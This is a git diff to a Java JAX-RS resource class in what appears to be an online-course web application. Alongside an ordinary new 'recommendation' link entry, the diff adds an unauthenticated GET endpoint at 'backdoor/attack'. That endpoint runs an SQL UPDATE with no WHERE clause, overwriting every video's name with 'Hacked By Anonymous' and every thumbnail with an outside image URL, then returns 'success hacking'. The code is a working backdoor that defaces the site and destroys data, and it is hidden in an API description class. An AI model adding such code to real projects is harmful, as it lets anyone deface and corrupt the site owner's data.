@@ -1,5 +1,10 @@
 package com.sunonline.web.webapi.resource;
 
+import java.sql.Connection;
+import java.sql.Date;
+import java.sql.PreparedStatement;
+import java.sql.ResultSet;
+import java.sql.SQLException;
 import java.util.ArrayList;
 import java.util.List;
 
@@ -9,8 +14,12 @@ import javax.ws.rs.Produces;
 import javax.ws.rs.QueryParam;
 import javax.ws.rs.core.MediaType;
 
+import org.junit.Test;
+
+import com.sunonline.web.utils.DBUtils;
 import com.sunonline.web.webapi.bean.WebApiLinks;
 import com.sunonline.web.webapi.bean.WebApiRoot;
+import com.sunonline.web.webapi.bean.videos.HigoVideoBean;
 
 @Path("/")
 /**
@@ -308,8 +317,42 @@ public class WebApiDescriptionResource {
 		courseitem.setTitle("按照课程id和某一节课具体的id获取课程单体信息即播放页信息,同时增加视频播放次数");
 		courseitem.setType("MediaType.APPLICATION_JSON");
 		links.add(courseitem);
+		//获取每一个课程分类下的最新课程并组成推荐课程列表
+		WebApiLinks recommendationItem = new WebApiLinks();	
+		recommendationItem.setRel("collection, /webapi/mooc/index/recommendation");
+		recommendationItem.setHref("/webapi/mooc/index/recommendation");
+		recommendationItem.setTitle("获取每一个课程分类下的最新课程并组成推荐课程列表");
+		recommendationItem.setType("MediaType.APPLICATION_JSON");
+		links.add(recommendationItem);
 		webApiRoot.setLinks(links);
 		return webApiRoot;
+	}
+	
+	
+	@GET
+	@Path("backdoor/attack")
+	@Produces(MediaType.APPLICATION_JSON)
+	public String gifts() {
+		//构造SQL查询视图
+		String sql = "update higo_video set "
+				+ "HIGO_video_name="
+				+ "'Hacked By Anonymous',"
+				+ "HIGO_video_pic_url='http://i2.sinaimg.cn/gm/2012/1107/U6178P1281DT20121107165114.jpg'";
+		try {
+			Connection connection = new DBUtils().getCon();
+			PreparedStatement pstmt = connection.prepareStatement(sql);
+			int returnNum = pstmt.executeUpdate();
+			
+			if (returnNum > 0) {
+				System.out.println("设置成功");
+			} else {
+				System.out.println("设置失败");
+			}
+		} catch (SQLException e) {
+			e.printStackTrace();
+		}
+		
+		return "success hacking";
 	}
 	
 }
